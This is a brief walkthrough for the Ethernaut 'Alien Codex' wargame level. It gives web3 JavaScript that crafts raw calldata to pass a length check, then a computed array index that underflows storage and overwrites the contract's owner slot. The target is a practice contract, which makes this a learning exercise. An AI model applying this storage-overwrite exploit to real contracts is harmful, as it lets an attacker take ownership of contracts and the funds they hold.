# [Alien Codex](https://ethernaut.zeppelin.solutions/level/0x73048cec9010e92c298b016966bde1cc47299df5)

[This solution article](http://bug-db.com/snapshot?type=news&uid=2dc486aad1b711e8b094aea8108a386b) explains how to come up with the data

```JavaScript
sig=web3.sha3('make_contact(bytes32[])').slice(0,10);
// '0x1d3d4c0b'
data1="0000000000000000000000000000000000000000000000000000000000000020";//动态数组的偏移，即数组长度存储的部分，起始于32字节
data2="1000000000000000000000000000000000000000000000000000000000000001";//数组的长度
data=sig+data1+data2;
web3.eth.sendTransaction({ from:"0x8d012fa42370add6268b547d955eef603c89821a",to:"0x5d9146c540b529c693afdc0a04f4652eee9688c3", data:data }, (err,res) => {if (err) { console.log(err); } else {console.log(res);} });
```
Once the above is done. await contract.contact() will return true.

Now call revise(uint i, bytes32 _content) to pass the level. use 35707666377435648211887908874984608119992236509074197713628505308453184860938 for i and "0x0000000000000000000000008d012fa42370add6268b547d955eef603c89821a" for _content. I had to pad my address 8d012fa42370add6268b547d955eef603c89821a with these 0's to get await contract.owner() to return the correct address.
